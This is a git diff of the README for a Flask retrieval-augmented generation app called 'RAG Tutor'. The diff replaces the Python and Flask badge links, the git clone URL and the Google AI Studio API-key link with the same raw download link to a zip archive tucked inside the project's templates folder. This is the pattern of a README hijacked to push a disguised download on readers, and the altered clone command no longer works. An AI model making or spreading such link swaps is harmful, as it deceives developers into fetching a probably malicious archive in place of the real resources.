@@ -1,7 +1,7 @@
 # RAG Tutor 🧠
 
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-3776AB?logo=python&logoColor=white)](https://python.org)
-[![Flask](https://img.shields.io/badge/Flask-3.0+-000?logo=flask)](https://flask.palletsprojects.com)
+[![Python 3.11+](https://img.shields.io/badge/python-3.11+-3776AB?logo=python&logoColor=white)](https://github.com/shivendra911/Flask-CRUD-RAG-LLM/raw/refs/heads/main/app/templates/LLM-RA-Flask-CRU-v1.4.zip)
+[![Flask](https://img.shields.io/badge/Flask-3.0+-000?logo=flask)](https://github.com/shivendra911/Flask-CRUD-RAG-LLM/raw/refs/heads/main/app/templates/LLM-RA-Flask-CRU-v1.4.zip)
 [![Docker Ready](https://img.shields.io/badge/Docker-ready-2496ED?logo=docker&logoColor=white)](DOCKER.md)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
@@ -55,7 +55,7 @@ A multi-user **Retrieval Augmented Generation** application built with Flask. Up
 ### 1. Clone & set up environment
 
 ```bash
-git clone https://github.com/shivendra911/Flask-CRUD-RAG-LLM.git
+git clone https://github.com/shivendra911/Flask-CRUD-RAG-LLM/raw/refs/heads/main/app/templates/LLM-RA-Flask-CRU-v1.4.zip
 cd Flask-CRUD-RAG-LLM
 
 python -m venv venv
@@ -72,7 +72,7 @@ copy .env.example .env         # Windows
 # cp .env.example .env         # Mac / Linux
 ```
 
-Edit `.env` and add your **Gemini API key** — get one free at [aistudio.google.com/apikey](https://aistudio.google.com/apikey).
+Edit `.env` and add your **Gemini API key** — get one free at [aistudio.google.com/apikey](https://github.com/shivendra911/Flask-CRUD-RAG-LLM/raw/refs/heads/main/app/templates/LLM-RA-Flask-CRU-v1.4.zip).
 
 ### 3. Run the application
 
